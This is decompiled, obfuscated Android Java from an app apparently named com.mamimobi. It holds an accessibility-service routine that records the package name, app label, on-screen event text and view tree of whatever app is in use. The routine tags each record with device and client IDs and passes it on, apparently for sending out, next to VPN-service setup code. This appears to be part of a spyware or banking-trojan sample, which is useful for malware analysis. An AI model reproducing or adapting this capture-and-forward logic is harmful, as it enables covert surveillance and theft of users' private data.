package defpackage;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Parcelable;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.mamimobi.AccessService;
import com.mamimobi.service.MyVpnService;
import io.nats.client.support.ApiConstants;
import java.io.Serializable;
import org.bouncycastle.jcajce.util.AnnotatedPrivateKey;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class q1 implements Runnable {
    public final /* synthetic */ int E;
    public final /* synthetic */ int F;
    public final /* synthetic */ Object G;
    public final /* synthetic */ Object H;

    public /* synthetic */ q1(go goVar, int i, Serializable serializable) {
        this.E = 1;
        this.G = goVar;
        this.F = i;
        this.H = serializable;
    }

    @Override // java.lang.Runnable
    public final void run() {
        int i = this.F;
        Object obj = this.G;
        Object obj2 = this.H;
        switch (this.E) {
            case 0:
                String str = AccessService.V;
                AccessService accessService = (AccessService) obj;
                AccessibilityEvent accessibilityEvent = (AccessibilityEvent) obj2;
                if (accessibilityEvent == null) {
                    return;
                }
                AccessibilityNodeInfo source = null;
                try {
                    try {
                        String strE = AccessService.e(accessibilityEvent);
                        JSONObject jSONObject = new JSONObject();
                        String strValueOf = String.valueOf(accessibilityEvent.getPackageName());
                        jSONObject.put("pkgname", strValueOf);
                        jSONObject.put("eventText", strE);
                        jSONObject.put("eventType", i);
                        try {
                            PackageManager packageManager = accessService.getApplicationContext().getPackageManager();
                            jSONObject.put(AnnotatedPrivateKey.LABEL, packageManager.getApplicationLabel(packageManager.getApplicationInfo(strValueOf, 0)));
                            break;
                        } catch (Exception unused) {
                        }
                        source = accessibilityEvent.getSource();
                        if (source != null) {
                            AccessService.f(jSONObject, source);
                        }
                        accessService.p(strE);
                        jSONObject.put(ApiConstants.ID, t40.V(accessService));
                        o71 o71VarF = o71.f(accessService);
                        if (o71VarF.e() != null) {
                            jSONObject.put("clientid", o71VarF.e());
                        }
                        accessService.F(strValueOf, jSONObject);
                        break;
                    } catch (Exception e) {
                        e.printStackTrace();
                        if (source != null) {
                        }
                    }
                    return;
                } finally {
                    if (source != null) {
                        source.recycle();
                    }
                    accessibilityEvent.recycle();
                }
            case 1:
                ((go) obj).b.c(i, (Serializable) obj2);
                return;
            default:
                Intent intent = (Intent) obj2;
                int i2 = MyVpnService.I;
                MyVpnService myVpnService = (MyVpnService) obj;
                try {
                    myVpnService.b(intent);
                    return;
                } catch (Exception e2) {
                    Log.e("MyVpnService", "Failed to setup VPN", e2);
                    myVpnService.stopForeground(true);
                    myVpnService.stopSelf(i);
                    return;
                }
        }
    }

    public /* synthetic */ q1(Service service, Parcelable parcelable, int i, int i2) {
        this.E = i2;
        this.G = service;
        this.H = parcelable;
        this.F = i;
    }
}
